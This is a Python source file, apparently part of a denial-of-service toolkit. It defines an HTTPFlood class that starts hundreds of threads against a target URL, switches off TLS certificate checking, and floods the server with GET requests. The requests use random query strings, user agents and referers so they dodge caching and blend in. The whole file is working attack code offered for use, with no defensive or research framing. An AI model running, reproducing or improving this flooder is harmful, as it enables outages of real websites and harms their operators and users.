import socket
import ssl
import random
import threading
import time
from urllib.parse import urlparse
from core.colors import *
from core.useragent import UserAgent

class HTTPFlood:
    def __init__(self, url, threads=500, sockets=1000, duration=0, proxy_file=None, stats=None):
        self.url = url
        parsed = urlparse(url)
        self.host = parsed.hostname
        self.port = parsed.port or (443 if parsed.scheme == 'https' else 80)
        self.is_ssl = parsed.scheme == 'https'
        self.path = parsed.path or '/'
        self.threads = threads
        self.sockets = sockets
        self.duration = duration
        self.stats = stats
        self.running = False
    
    def _worker(self):
        while self.running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(5)
                sock.connect((self.host, self.port))
                
                if self.is_ssl:
                    ctx = ssl.create_default_context()
                    ctx.check_hostname = False
                    ctx.verify_mode = ssl.CERT_NONE
                    sock = ctx.wrap_socket(sock, server_hostname=self.host)
                
                for _ in range(20):
                    if not self.running: break
                    query = random.randint(1000, 999999)
                    ua = UserAgent.random_agent()
                    ref = UserAgent.random_referer()
                    
                    request = (
                        f"GET {self.path}?rnd={query} HTTP/1.1\r\n"
                        f"Host: {self.host}\r\n"
                        f"User-Agent: {ua}\r\n"
                        f"Referer: {ref}\r\n"
                        f"Accept: */*\r\n"
                        f"Cache-Control: no-cache\r\n"
                        f"Connection: keep-alive\r\n"
                        f"\r\n"
                    )
                    
                    sock.sendall(request.encode())
                    if self.stats:
                        self.stats.increment_sent()
                        self.stats.add_bytes(len(request))
                
                sock.close()
            except:
                if self.stats:
                    self.stats.increment_failed()
    
    def attack(self):
        self.running = True
        threads = []
        
        for _ in range(self.threads):
            t = threading.Thread(target=self._worker, daemon=True)
            t.start()
            threads.append(t)
        
        start = time.time()
        while self.running:
            if self.duration > 0 and (time.time() - start) > self.duration:
                break
            time.sleep(1)
        
        self.running = False
